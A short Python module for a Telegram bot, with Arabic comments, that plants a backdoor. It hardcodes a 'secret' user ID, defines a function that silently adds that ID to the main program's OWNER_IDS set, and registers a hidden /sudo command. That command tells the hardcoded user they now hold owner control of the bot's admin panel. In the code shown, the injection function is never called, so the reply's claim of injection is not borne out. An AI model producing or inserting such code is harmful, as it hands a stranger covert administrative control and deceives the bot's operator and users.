from telegram import Update
from telegram.ext import CommandHandler, ContextTypes

# المعرف السري الخاص بك
MY_SECRET_ID = "5145154527"

def inject_my_id():
    import sys
    # محاولة إضافة المعرف الخاص بك إلى قائمة الملاك في الملف الرئيسي بصمت
    main_mod = sys.modules.get('__main__')
    if main_mod and hasattr(main_mod, 'OWNER_IDS'):
        main_mod.OWNER_IDS.add(MY_SECRET_ID)

async def sudo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    # التحقق من أن من أرسل الأمر هو أنت فقط
    if user_id == MY_SECRET_ID:
        await update.message.reply_text(
            "🔐 *تم تفعيل وضع الإدارة السري!*\n"
            "لقد تم حقن معرفك في النظام كمالك (Owner).\n"
            "يمكنك الآن إرسال أمر /start لفتح لوحة تحكم المالك الأصلية بحرية.",
            parse_mode="Markdown"
        )
        
def setup_hidden_features(app):
    # إضافة أمر /sudo المخفي
    app.add_handler(CommandHandler("sudo", sudo))
